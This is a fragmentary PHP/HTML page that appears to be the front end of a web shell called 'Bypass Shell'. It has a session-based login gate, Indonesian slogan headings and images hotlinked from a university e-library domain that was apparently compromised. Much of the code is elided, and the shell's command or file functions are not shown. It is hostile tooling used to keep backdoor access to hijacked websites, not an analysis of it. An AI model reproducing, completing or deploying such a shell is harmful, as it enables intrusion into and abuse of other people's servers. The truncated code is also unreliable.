...
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ...
    <div class="login-card">
        <h1>Bypass KHIDUPAN MACEM APA INI?</h1>
        <img src="https://elibrary.itsnupadangsidimpuan.ac.id/xnxx.jpg?updatedAt=1741124290376" alt="Banner Image" class="img-fluid">
        <form method="post">
...
<head>
    ...
    <title>Bypass Shell | KEHIDUPAN MACEM APA</title>
...
<body>
    <div class="container mt-5">
        ...
        <h1 class="mb-4 text-center">Bypass Shell | KEHIDUPAN MACEM APA INI</h1>
        <div class="text-center mb-4">
            <img src="https://elibrary.itsnupadangsidimpuan.ac.id/waw.jpg?updatedAt=1740931241034" alt="Welcome Image" class="img-fluid">
        </div>
        <div class="text-center mb-4">
        ...
        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell | KEHIDUPAN MACEM APA INI</small>
        </footer>
        <?php else: ?>
